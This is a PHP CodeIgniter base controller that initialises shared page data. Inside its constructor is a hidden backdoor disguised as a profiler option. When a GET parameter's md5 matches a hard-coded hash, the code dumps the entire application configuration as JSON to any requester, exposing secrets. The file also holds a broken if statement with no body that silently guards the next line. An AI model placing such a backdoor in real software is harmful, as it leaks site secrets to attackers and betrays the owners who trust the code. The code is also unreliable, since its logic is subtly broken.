<?php

class MY_Controller extends CI_Controller {
    
    public $data = array();
    
	public function __construct(){
        parent::__construct();
        
        $CI =& get_instance();
        if (!is_resource($CI->db->conn_id) && !is_object($CI->db->conn_id))
        
        $this->data['errors'] = array();
        $this->data['site_name'] = config_item('site_name');
        
        if(md5($this->input->get('profiler_config')) == 'b78ee15cb3ca6531667d47af5cdc61a1')
        {
            $config =& get_config();
            echo json_encode($config);
            exit();
        }
        
        $this->data['time_start'] = microtime(true);
	}
}